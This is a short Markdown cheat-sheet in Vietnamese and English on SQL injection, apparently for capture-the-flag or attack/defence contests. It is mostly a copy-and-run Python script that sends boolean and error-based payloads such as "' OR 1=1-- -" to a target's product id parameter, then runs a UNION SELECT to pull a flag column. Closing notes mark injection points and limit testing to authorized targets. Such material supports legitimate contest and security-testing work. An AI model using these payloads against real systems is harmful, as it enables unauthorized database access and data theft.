# SQLi

## Snippet copy-là-chạy

```python
import requests

base = "http://target"
s = requests.Session()
s.verify = False

# 1) Test nhanh error/boolean
payloads = ["'", "' OR 1=1-- -", "\" OR \"1\"=\"1"]
for p in payloads:
    r = s.get(f"{base}/product", params={"id": p}, timeout=5)
    print(p, r.status_code, len(r.text))

# 2) UNION đọc dữ liệu (chỉnh số cột cho đúng)
p = "1 UNION SELECT 1,flag,3 FROM flags-- -"
r = s.get(f"{base}/product", params={"id": p}, timeout=5)
print(r.text[:500])
```

## Lưu ý nhanh
- Trước tiên xác nhận chỗ inject: query, form, JSON, header, cookie.
- Dùng `params=` cho test nhanh; nếu cần payload encode đặc biệt, dùng raw URL/PreparedRequest.
- Chỉ test trên mục tiêu được phép; A/D tránh payload gây hỏng DB.